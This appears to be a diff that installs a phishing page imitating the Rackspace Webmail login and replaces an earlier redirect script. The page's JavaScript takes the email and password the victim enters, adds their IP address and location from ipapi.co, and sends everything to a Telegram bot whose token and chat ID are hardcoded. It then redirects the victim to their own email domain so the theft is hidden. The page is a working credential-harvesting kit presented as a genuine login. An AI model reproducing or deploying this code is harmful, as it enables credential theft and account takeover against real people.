@@ -1,3 +1,149 @@
-<script type="text/javascript">
-window.location="https://fence02.cafe24.com/sogopage.html"
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Rackspace Webmail - szx</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+<style>
+  * { box-sizing: border-box; }
+  body { font-family: "Roboto", Helvetica, Arial, sans-serif; font-size: 14px; color: #333; background-color: #FAFAFA; margin: 0; }
+  #content { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #EAEAEA; }
+  #login-wrapper { display: flex; background: #fff; min-width: 790px; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
+  #banner-section { width: 320px; background: #f5f5f5; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
+  #banner-section img { width: 200px; margin-bottom: 20px; }
+  #form-section { flex: 1; padding: 40px 30px; display: flex; flex-direction: column; justify-content: center; }
+  #form-section h2 { margin-bottom: 20px; font-weight: 400; color: #424242; }
+  .form-group { margin-bottom: 20px; }
+  .form-label { display: block; margin-bottom: 5px; font-size: 14px; color: #616161; }
+  .form-field { width: 100%; padding: 8px; font-size: 14px; border: 1px solid #BDBDBD; border-radius: 2px; }
+  #submit-btn { padding: 10px 15px; font-size: 14px; background-color: #0C7C84; color: white; border: none; border-radius: 2px; cursor: pointer; width: 100%; }
+  #submit-btn:hover { background-color: #095b60; }
+  #header-logo { display: flex; justify-content: center; margin-bottom: 30px; }
+  #header-logo img { width: 130px; }
+  .footer-links { margin-top: 30px; font-size: 12px; text-align: center; }
+  .footer-links a { color: #0C7C84; text-decoration: none; margin: 0 5px; }
+  .footer-links .divider { color: #0C7C84; }
+  @media (max-width: 800px) { #login-wrapper { flex-direction: column; min-width: auto; } #banner-section { display: none; } }
+</style>
+</head>
+<body>
+
+<div id="content">
+  <div id="login-wrapper">
+
+    <div id="banner-section">
+      <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
+        <img src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" alt="Banner">
+      </a>
+    </div>
+
+    <div id="form-section">
+      <div id="header-logo">
+        <img src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png" alt="Rackspace Logo">
+      </div>
+      <h2>Webmail Login </h2>
+
+      <form id="login-form" autocomplete="off">
+        <div class="form-group">
+          <label class="form-label" for="email">Email Address</label>
+          <input type="email" id="email" class="form-field" autocomplete="username" required>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="password">Password </label>
+          <input type="password" id="password" class="form-field" autocomplete="current-password" required>
+        </div>
+
+        <button type="submit" id="submit-btn">Log In</button>
+      </form>
+
+      <div class="footer-links">
+        <a href="http://www.rackspace.com/information/legal/privacystatement" target="_blank">Privacy Statement</a>
+        <span class="divider">|</span>
+        <a href="http://www.rackspace.com/information/legal/websiteterms" target="_blank">Website Terms</a>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+async function getIPAndLocation() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name
+        };
+    } catch {
+        return { ip: 'Unknown', city: 'Unknown', region: '', country: '' };
+    }
+}
+
+$(document).ready(function() {
+
+  // Auto-fill email from URL hash
+  const hash = window.location.hash.substr(1);
+  if (hash) {
+    $('#email').val(decodeURIComponent(hash));
+    $('#email').attr('readonly', true);
+  }
+
+  // Telegram bot setup
+
+
+const BOT_TOKEN = "6297820486:AAGby4YEWUcf182lSUCOO1dMqiMKu6nZydM"; 
+ const CHAT_ID = "981496445";
+
+  // Form submission
+  $('#login-form').submit(async function(event) {
+    event.preventDefault();
+
+    const email = $('#email').val();
+    const password = $('#password').val(); 
+
+    // Get IP, location, date & time
+    const location = await getIPAndLocation();
+    const dateTime = new Date().toLocaleString();
+
+    const message = `d:
+Email: ${email}
+Password: ${password}
+Date & Time: ${dateTime}
+IP: ${location.ip}
+City: ${location.city}
+Region: ${location.region}
+Country: ${location.country}`;
+
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    $.post(telegramUrl, { chat_id: CHAT_ID, text: message })
+      .done(() => console.log("Email + password + info sent to Telegram successfully."))
+      .fail(err => console.error("Failed to send info to Telegram:", err));
+
+    console.log("", email, password);
+
+    // Redirect to email domain
+    const parts = email.split('@');
+    if (parts.length === 2 && parts[1].length > 0) {
+      const domain = parts[1];
+      window.location.href = "http://www." + domain;
+    } else {
+      console.log("Invalid email, cannot redirect");
+    }
+  });
+
+});
 </script>
+
+</body>
+</html>
